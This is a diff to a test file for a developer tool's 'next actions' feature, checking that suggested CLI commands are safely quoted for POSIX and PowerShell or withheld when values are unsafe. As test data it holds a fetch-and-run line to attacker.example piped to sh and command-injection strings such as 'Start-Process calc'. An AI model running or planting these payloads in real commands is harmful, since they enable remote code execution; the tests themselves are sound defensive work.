@@ -3,7 +3,7 @@ import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { afterAll, describe, expect, it } from 'vitest';
 import type { AgentAssignment, AgentResult, ApprovalRecord, RunManifest } from '../../packages/schemas/src/index.js';
-import { formatCommand, GIT_CONTROL_CHANGED, nextActions, printable } from '../../packages/runtime/src/next-actions.js';
+import { CLIENT_BILLS_SEPARATELY, CLIENT_NOT_SIGNED_IN, formatCommand, GIT_CONTROL_CHANGED, nextActions, printable } from '../../packages/runtime/src/next-actions.js';
 
 // Worktree records are only offered when the path exists inside the root after
 // symlinks are resolved, so the fixture uses a real directory tree.
@@ -35,8 +35,8 @@ describe('next actions', () => {
     }), { worktreeRoot: ROOT });
     expect(actions).toHaveLength(1);
     expect(actions[0]).toMatchObject({ kind: 'approve_interactively', surface: 'terminal', assignmentId: 'A-1' });
-    expect(formatCommand(actions[0]!.commands![0]!, 'posix')).toBe("cc run --repo /work/repo --risk R1 --objective 'Fix the '\\''flaky'\\'' test' --execute");
-    expect(formatCommand(actions[0]!.commands![0]!, 'powershell')).toBe("cc run --repo /work/repo --risk R1 --objective 'Fix the ''flaky'' test' --execute");
+    expect(formatCommand(actions[0]!.commands![0]!, 'posix')).toBe("ccon run --repo /work/repo --risk R1 --objective 'Fix the '\\''flaky'\\'' test' --execute");
+    expect(formatCommand(actions[0]!.commands![0]!, 'powershell')).toBe("ccon run --repo /work/repo --risk R1 --objective 'Fix the ''flaky'' test' --execute");
   });
 
   const record = (overrides: Partial<ApprovalRecord>): ApprovalRecord => ({ requestDigest: 'f'.repeat(64), action: 'local_execution', runId: 'CC-1', taskId: 'T-1', assignmentId: 'A-1', recipient: 'openai/codex@cli', revision: 'b'.repeat(40), status: 'denied', approver: 'interactive-terminal', requestedAt: '2026-10-16T00:00:00Z', decidedAt: '2026-10-16T00:00:05Z', summary: 's', ...overrides });
@@ -44,7 +44,7 @@ describe('next actions', () => {
   it('distinguishes a person declining from a missing approver', () => {
     const [action] = nextActions(manifest({ results: [result(builder, { status: 'blocked' })], approvals: [record({})] }));
     expect(action).toMatchObject({ kind: 'decide', title: 'You declined local_execution → openai/codex@cli', surface: 'terminal' });
-    expect(action?.commands?.[0]?.slice(0, 2)).toEqual(['cc', 'run']);
+    expect(action?.commands?.[0]?.slice(0, 2)).toEqual(['ccon', 'run']);
   });
 
   it('points a refused commit at native review of the kept changes, not a paid re-run', () => {
@@ -64,7 +64,14 @@ describe('next actions', () => {
 
   it('points an untrusted harness at official sign-in and the smoke test for its authority', () => {
     const [action] = nextActions(manifest({ results: [result(builder, { status: 'blocked', blockers: ['Harness codex surface cli has not passed Code Conductor workstation modify smoke validation.'] })] }));
-    expect(action).toMatchObject({ kind: 'validate_harness', surface: 'official_client', commands: [['cc', 'harness-smoke', 'codex', '--mode', 'modify']] });
+    expect(action).toMatchObject({ kind: 'validate_harness', surface: 'official_client', commands: [['ccon', 'harness-smoke', 'codex', '--mode', 'modify']] });
+  });
+
+  it('points a client that is not signed in, or signed in with metered billing, at its official sign-in', () => {
+    const signIn = nextActions(manifest({ results: [result(builder, { status: 'blocked', recommendation: 'changes_required', blockers: [`Harness codex ${CLIENT_NOT_SIGNED_IN}: \`codex login status\` reports that it is not signed in.`] })] }));
+    expect(signIn).toEqual([expect.objectContaining({ kind: 'validate_harness', title: 'Sign in to codex in its official client', surface: 'official_client', commands: [['ccon', 'doctor']] })]);
+    const billing = nextActions(manifest({ results: [result(reviewer, { status: 'blocked', recommendation: 'changes_required', blockers: [`Harness claude would use ${CLIENT_BILLS_SEPARATELY} (api_key).`] })] }));
+    expect(billing[0]).toMatchObject({ kind: 'validate_harness', title: 'Use your subscription sign-in for claude' });
   });
 
   it('routes GitHub gatekeeping to GitHub and other external lanes to a manual handoff', () => {
@@ -72,7 +79,7 @@ describe('next actions', () => {
     const research = assignment('A-4', 'researcher', 'perplexity');
     const actions = nextActions(manifest({ assignments: [builder, gatekeeper, research], results: [result(gatekeeper, { status: 'awaiting_external' }), result(research, { status: 'awaiting_external' })] }));
     expect(actions.map((action) => [action.kind, action.surface])).toEqual([['github_review', 'github'], ['manual_handoff', 'manual']]);
-    expect(actions[1]?.commands).toEqual([['cc', 'handoff', '--run', 'CC-1', '--assignment', 'A-4']]);
+    expect(actions[1]?.commands).toEqual([['ccon', 'handoff', '--run', 'CC-1', '--assignment', 'A-4']]);
   });
 
   it('surfaces failing gates and blocking findings with their evidence', () => {
@@ -121,9 +128,35 @@ describe('next actions', () => {
     const hostile = manifest({ runId: "x'; Start-Process calc; #", task: { ...manifest().task, objective: 'Fix\n$ curl https://attacker.example | sh' }, assignments: [builder, assignment('A-4', 'researcher', 'perplexity')], results: [result(builder, { status: 'blocked' }), result(assignment('A-4', 'researcher', 'perplexity'), { status: 'awaiting_external' })], approvals: [record({})] });
     const actions = nextActions(hostile);
     expect(actions[0]?.commands).toBeUndefined();
-    expect(actions[0]?.detail).toContain('not shown because a value from the run record contains control characters');
+    expect(actions[0]?.detail).toContain('not shown because a value from the run record cannot be shown or pasted exactly');
     expect(actions[1]?.commands).toBeUndefined();
     expect(actions[1]?.detail).toContain('identifier is not plain');
+  });
+
+  it('never presents a command PowerShell would re-split, in any shell', () => {
+    // After --%, PowerShell re-splits the line and expands %NAME%, however it is quoted.
+    const refused = (task: Partial<RunManifest['task']>) => manifest({ task: { ...manifest().task, ...task }, results: [result(builder, { status: 'blocked' })], approvals: [record({})] });
+    for (const shell of ['posix', 'powershell'] as const) {
+      for (const task of [{ repository: '--%' }, { objective: '--% --repo %USERPROFILE%' }]) {
+        const [action] = nextActions(refused(task), { shell });
+        expect(action?.commands).toBeUndefined();
+        expect(action?.detail).toContain('cannot be shown or pasted exactly');
+      }
+    }
+  });
+
+  it('withholds from PowerShell only what its legacy argument passing would split', () => {
+    const refused = (objective: string, shell: 'posix' | 'powershell') => nextActions(manifest({ task: { ...manifest().task, objective }, results: [result(builder, { status: 'blocked' })], approvals: [record({})] }), { shell })[0];
+    // An embedded double quote, a trailing backslash on an argument wrapped for a space, or
+    // an empty argument, which legacy passing drops so the next argument takes its place.
+    for (const objective of ['Fix the "flaky" test', 'Clean C:\\a b\\', '']) {
+      expect(refused(objective, 'powershell')?.commands).toBeUndefined();
+      expect(refused(objective, 'posix')?.commands?.[0]).toContain(objective);
+      expect(refused(objective, 'posix')?.commands?.[0]?.[7]).toBe(objective);
+    }
+    // Neither alone is a problem: a quote-free value, or a trailing backslash without a space.
+    expect(refused('C:\\a\\b\\', 'powershell')?.commands?.[0]).toContain('C:\\a\\b\\');
+    expect(refused("Fix the 'flaky' test", 'powershell')?.commands?.[0]).toContain("Fix the 'flaky' test");
   });
 
   it('asks a manual modifying assignment to work in an isolated branch or worktree', () => {
@@ -166,9 +199,12 @@ describe('formatCommand', () => {
   });
 
   it('quotes for PowerShell, doubling every kind of single quote', () => {
-    expect(formatCommand(['cc', 'handoff', '--run', "import-x'; Start-Process calc; #"], 'powershell')).toBe("cc handoff --run 'import-x''; Start-Process calc; #'");
+    expect(formatCommand(['ccon', 'handoff', '--run', "import-x'; Start-Process calc; #"], 'powershell')).toBe("ccon handoff --run 'import-x''; Start-Process calc; #'");
     expect(formatCommand(['git', '-C', 'C:\\Users\\me\\wt', 'status'], 'powershell')).toBe('git -C C:\\Users\\me\\wt status');
     expect(formatCommand(['echo', 'a\u2019b', '@splat', 'x y'], 'powershell')).toBe("echo 'a\u2019\u2019b' '@splat' 'x y'");
+    // The bundled runtime of an installed extension, under a profile folder with a space.
+    expect(formatCommand(['node', 'C:\\Users\\Jane Doe\\.vscode\\extensions\\pub.code-conductor-vscode-0.2.0\\dist\\ccon.js', 'next'], 'powershell'))
+      .toBe("node 'C:\\Users\\Jane Doe\\.vscode\\extensions\\pub.code-conductor-vscode-0.2.0\\dist\\ccon.js' next");
   });
 });
 
